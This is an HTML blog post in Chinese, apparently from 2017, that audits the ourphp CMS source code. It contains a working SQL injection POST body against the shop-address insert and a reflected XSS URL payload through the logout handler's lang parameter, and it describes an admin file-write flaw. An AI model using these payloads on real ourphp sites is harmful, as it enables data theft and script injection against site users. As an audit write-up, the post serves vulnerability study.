@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>审计入门之路（二）：ourphp | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="审计之初清明连着个周三，没什么课，继续下一个CMS了，这次是ourphp。他用的smarty模板引擎，之前没有接触过，所以简单学了下模板引擎。从index开始审了一天，发现了一些东西。  从用户模块的index开始，包含了版本信息，配置信息，语言，公共函数和模板引擎。123456include &apos;../../config/ourphp_code.php&apos;;include &apos;../../config">
+<meta property="og:type" content="article">
+<meta property="og:title" content="审计入门之路（二）：ourphp">
+<meta property="og:url" content="http://hebic.me/2017/08/19/审计入门之路（二）：ourphp/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="审计之初清明连着个周三，没什么课，继续下一个CMS了，这次是ourphp。他用的smarty模板引擎，之前没有接触过，所以简单学了下模板引擎。从index开始审了一天，发现了一些东西。  从用户模块的index开始，包含了版本信息，配置信息，语言，公共函数和模板引擎。123456include &apos;../../config/ourphp_code.php&apos;;include &apos;../../config">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/04/2242526920.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/04/86846092.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/04/4071474630.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/04/3888413363.jpg">
+<meta property="og:updated_time" content="2017-08-20T00:54:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="审计入门之路（二）：ourphp">
+<meta name="twitter:description" content="审计之初清明连着个周三，没什么课，继续下一个CMS了，这次是ourphp。他用的smarty模板引擎，之前没有接触过，所以简单学了下模板引擎。从index开始审了一天，发现了一些东西。  从用户模块的index开始，包含了版本信息，配置信息，语言，公共函数和模板引擎。123456include &apos;../../config/ourphp_code.php&apos;;include &apos;../../config">
+<meta name="twitter:image" content="http://120.25.80.195:7230/04/2242526920.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#审计之初"><span class="toc-text">审计之初</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反射型XSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束"><span class="toc-text">结束</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-审计入门之路（二）：ourphp" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">审计入门之路（二）：ourphp</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.08.19</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/08/19/审计入门之路（二）：ourphp/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="审计之初"><a href="#审计之初" class="headerlink" title="审计之初"></a>审计之初</h2><p>清明连着个周三，没什么课，继续下一个CMS了，这次是ourphp。他用的smarty模板引擎，之前没有接触过，所以简单学了下模板引擎。从index开始审了一天，发现了一些东西。</p>
+<p><img src="http://120.25.80.195:7230/04/2242526920.jpg" alt="1.jpg"></p>
+<p>从用户模块的index开始，包含了版本信息，配置信息，语言，公共函数和模板引擎。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'../../config/ourphp_code.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../../config/ourphp_config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../../config/ourphp_version.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../../config/ourphp_Language.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../../function/ourphp_function.class.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../../function/ourphp/Smarty.class.php'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>index结束时包含了用户控制，页面控制和模板加载。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'ourphp_user.class.php'</span>;<span class="comment">//用户控制和用户提问</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'ourphp_page.class.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'ourphp_template.class.php'</span>;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>ourphp_template.class.php</code>，一个函数判断了URL中使用的模板，include对应的php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($temptypetoo)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"cn"</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'./ourphp_userview.class.php'</span>;</span><br><span class="line">		<span class="keyword">if</span>($smarty-&gt;templateExists($ourphp_templates.<span class="string">"/"</span>.$ourphp_Language.<span class="string">"_index.html"</span>))&#123;<span class="comment">//templates/default/cn_index.html</span></span><br><span class="line">		$smarty-&gt;display($ourphp_Language.<span class="string">'_index.html'</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $ourphp_tempno;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"reg.html"</span>:</span><br><span class="line">		<span class="keyword">include</span> <span class="string">'./ourphp_userreg.class.php'</span>;</span><br><span class="line">		<span class="keyword">if</span>($smarty-&gt;templateExists($ourphp_templates.<span class="string">"/"</span>.$ourphp_Language.<span class="string">"_reg.html"</span>))&#123;</span><br><span class="line">		$smarty-&gt;display($ourphp_Language.<span class="string">'_reg.html'</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> $ourphp_tempno;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>跟进注册相关的php，<code>ourphp_userreg.class.php</code> 却居然几乎没看到交互的函数。后来本地注册抓包，才知道交互的数据进入<code>ourplay_play.class.php</code>。</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>没有用全局过滤，他防止注入的方式是在输入的参数后加过滤函数<code>dowith_sql</code>，追进函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dowith_sql</span><span class="params">($ourphpstr)</span></span>&#123;</span><br><span class="line">   $ourphpstr = addslashes($ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">" and "</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">" or "</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"execute"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"update"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"count"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"chr"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"truncate"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"char"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"declare"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"select"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"create"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"delete"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"insert"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"limit"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"extractvalue"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"concat"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"||"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"alert"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"script"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"iframe"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"embed"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"*"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"#"</span>,<span class="string">""</span>,$ourphpstr);</span><br><span class="line">   $ourphpstr = str_ireplace(<span class="string">"'"</span>,<span class="string">"\\'"</span>,$ourphpstr);</span><br><span class="line">   <span class="keyword">return</span> $ourphpstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>本来是没看出问题的，后来看了乐清小俊杰师傅的文章，才意识到sele||ct会被还原成select的。不过过滤了单引号，包裹在单引号里的逃逸不出来也没办法。看了一圈没找到没有被单引号包围的，遂放弃。</p>
+<p>不过有的输入没有进入过滤函数就写进了数据库：316行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>($_GET[<span class="string">"ourphp_cms"</span>] == <span class="string">'shopadd'</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">"OP_Addname"</span>] == <span class="string">''</span> || $_POST[<span class="string">"OP_Addtel"</span>] == <span class="string">''</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"&lt;script language=javascript&gt; alert('"</span>.$inputno.<span class="string">"');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$add = implode(<span class="string">'|'</span>,$_POST[<span class="string">'OP_Add'</span>]);</span><br><span class="line">	$query = $db -&gt; insert(<span class="string">"`ourphp_usershopadd`"</span>,<span class="string">"`OP_Addname` = '"</span>.$_POST[<span class="string">"OP_Addname"</span>].<span class="string">"',`OP_Addtel` = '"</span>.$_POST[<span class="string">"OP_Addtel"</span>].<span class="string">"',`OP_Add` = '"</span>.$add.<span class="string">"',`OP_Addindex` = 0,`OP_Adduser` = '"</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">"',`time` = '"</span>.date(<span class="string">"Y-m-d H:i:s"</span>).<span class="string">"'"</span>,<span class="string">""</span>);</span><br></pre></td></tr></table></figure></p>
+<p><code>$_POST[&#39;OP_Add&#39;]</code>经过implode处理进入$add，被拼接进SQL语句。</p>
+<p>url:<code>ourphp/client/user/ourphp_play.class.php?ourphp_cms=integral&amp;ourphp_cms=shopadd</code><br>post:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OP_Addname=a&amp;OP_Addtel=a&amp;OP_Addname=aaaaaa&apos;,`OP_Addtel` = user(),`OP_Add` = &apos;bbbbbbbb&apos;,`OP_Addindex` = 0,`OP_Adduser` = &apos;test1@test.com&apos;,`time` = &apos;2017-04-05 19:22:59&apos;#</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://120.25.80.195:7230/04/86846092.jpg" alt="2.jpg"></p>
+<p>在收货人信息处拿到数据。</p>
+<p><img src="http://120.25.80.195:7230/04/4071474630.jpg" alt="3.jpg"></p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>224行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//退出</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>($_GET[<span class="string">"ourphp_cms"</span>] == <span class="string">'out'</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unset</span>($_SESSION[<span class="string">'username'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//处理Ucenter</span></span><br><span class="line">	<span class="keyword">if</span>($ourphp_usercontrol[<span class="string">'ucenter'</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">include_once</span> <span class="string">'../../config.inc.php'</span>;</span><br><span class="line">			<span class="keyword">include_once</span> <span class="string">'../../uc_client/client.php'</span>;</span><br><span class="line">			<span class="keyword">echo</span> uc_user_synlogout();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> @ourphp_pcwapurl($_GET[<span class="string">'type'</span>],<span class="string">'?'</span>.$_GET[<span class="string">"lang"</span>].<span class="string">'-login.html'</span>,<span class="string">'?'</span>.$_GET[<span class="string">"lang"</span>].<span class="string">'-userlogin.html'</span>,<span class="number">0</span>,<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+<p>$_GET[‘type’]和$_GET[“lang”]进入ourphp_pcwapurl函数。</p>
+<p>/function/ourphp_function.class.php 219行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ourphp_pcwapurl</span><span class="params">($type = <span class="string">''</span>,$pcurl = <span class="string">''</span>,$wapurl = <span class="string">''</span>,$goback = <span class="number">0</span>,$font = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ourphp;</span><br><span class="line">	<span class="keyword">if</span>($goback == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">''</span> || $type == <span class="string">'pc'</span>)&#123;</span><br><span class="line">			$url = $ourphp[<span class="string">'webpath'</span>].<span class="string">'client/user/'</span>.$pcurl;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>($type == <span class="string">'wap'</span>)&#123;</span><br><span class="line">			$url = $ourphp[<span class="string">'webpath'</span>].<span class="string">'client/wap/'</span>.$wapurl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>($font != <span class="string">''</span>)&#123;</span><br><span class="line">			$alert = <span class="string">'alert(\\'</span><span class="string">'.$font.'</span>\\<span class="string">');'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script language=javascript&gt;"</span>.$alert.<span class="string">"location.replace('"</span>.$url.<span class="string">"');&lt;/script&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"&lt;script language=javascript&gt;"</span>.$alert.<span class="string">"location.replace('"</span>.$url.<span class="string">"');&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"&lt;script language=javascript&gt;alert('"</span>.$font.<span class="string">"');history.go(-1);&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二个get参数被return，然后echo输出出来。</p>
+<p><code>ourphp/client/user/ourphp_play.class.php?ourphp_cms=out&amp;type=&amp;lang=a&#39;);alert(&#39;xss&#39;);&lt;/script&gt;//</code></p>
+<p><img src="http://120.25.80.195:7230/04/3888413363.jpg" alt="4.jpg"></p>
+<p>在这个文件中找ourphp_pcwapurl函数，发现：<br>168行<code>echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?cn-login.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-userlogin.html&#39;,0,&#39;&#39;);</code><br>218行<code>echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?cn-index.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-usercenter.html&#39;,0,&#39;&#39;);</code><br>234行<code>echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-login.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-userlogin.html&#39;,0,&#39;&#39;);</code><br>311行<code>echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-userintegral-op.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-userintegral-op.html&#39;,0,&#39;&#39;);</code><br>323行<code>echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-usershopadd.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-usershopadd.html&#39;,0,&#39;&#39;);</code><br>330行和336行。都是一样的XSS。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>在管理员后台发现一处写入文件<code>ourphp_filebox.php</code> 1426行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case &quot;save&quot;:</span><br><span class="line">    save($_REQUEST[&apos;ncontent&apos;], $_REQUEST[&apos;fename&apos;], $_REQUEST[&apos;encode&apos;]);</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure></p>
+<p>save函数在691行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $meurl,$folder;</span><br><span class="line">    <span class="keyword">echo</span> $folder;</span><br><span class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</span><br><span class="line">    maintop(<span class="string">"编辑"</span>);</span><br><span class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</span><br><span class="line">    $ydata = stripslashes($ncontent);</span><br><span class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</span><br><span class="line">    	$ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\\"</span><span class="string">".$folder.$fename."</span>\\<span class="string">" target=\\"</span>_blank\\<span class="string">"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\\n"</span></span><br><span class="line">            .<span class="string">"请选择 &lt;a href=\\"</span><span class="string">".$meurl."</span>?op=home&amp;folder=<span class="string">".$_SESSION['folder']."</span>\\<span class="string">"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\\"</span><span class="string">".$meurl."</span>?op=edit&amp;fename=<span class="string">".$fename."</span>&amp;folder=<span class="string">".$folder."</span>\\<span class="string">"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\\n"</span>;</span><br><span class="line">        $fp = <span class="keyword">null</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\\n"</span></span><br><span class="line">        .<span class="string">" &lt;a href=\\"</span><span class="string">".$meurl."</span>?op=home&amp;folder=<span class="string">".$_SESSION['folder']."</span>\\<span class="string">"&gt;返回文件管理&lt;/a&gt;\\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    home();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>尝试了多次都保存失败，后来发现$ydata拼接了$folder和$fename，$folder在58行有一处赋值<code>$folder = $filefolder;</code><br>在14行对$filefolder的定义<code>$filefolder = str_replace(&#39;\\\\&#39;,&#39;/&#39;,WEB_ROOT.$ourphp[&#39;webpath&#39;].&quot;templates/&quot;);</code>。WEB_ROOT和$ourphp[‘webpath’]都在配置文件<code>ourphp_config.php</code>中定义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'WEB_ROOT'</span>,substr(dirname(<span class="keyword">__FILE__</span>), <span class="number">0</span>, <span class="number">-7</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">include</span> <span class="string">'ourphp_mysql.php'</span>;</span><br><span class="line"></span><br><span class="line">	$ourphp = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'webpath'</span> =&gt; <span class="string">'/code/ourphp/'</span>,	<span class="comment">// 网站路径</span></span><br></pre></td></tr></table></figure>
+<p>因此$filefolder就是<code>C:/phpStudy/WWW/code/ourphp/code/ourphp/templates/</code>，<code>code/ourphp/</code>重复了两次，所以找不到文件夹。对一个不存在的文件夹返回上一级是不成功的，所以本地复现失败了。如果CMS装在网站根目录,<code>webpath</code>就是<code>&#39;/&#39;</code>，就可以正常指向。任意写入文件就没有问题了。</p>
+<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>用户和管理员的交互PHP写的比较乱，没有全局过滤，代码读着费劲，后期维护也费劲。不同功能的函数分散在各个文件中，还有很多函数都没读，看着太乱了，换下一个CMS</p>
+<p>乌云的师傅们都会去审某些cms也有可能那些cms读起来不费劲，找漏洞有成就感。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/08/19/审计入门之路（一）：YzmCMS/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/08/19/审计入门之路（三）：Hadsky/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/08/19/审计入门之路（二）：ourphp/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
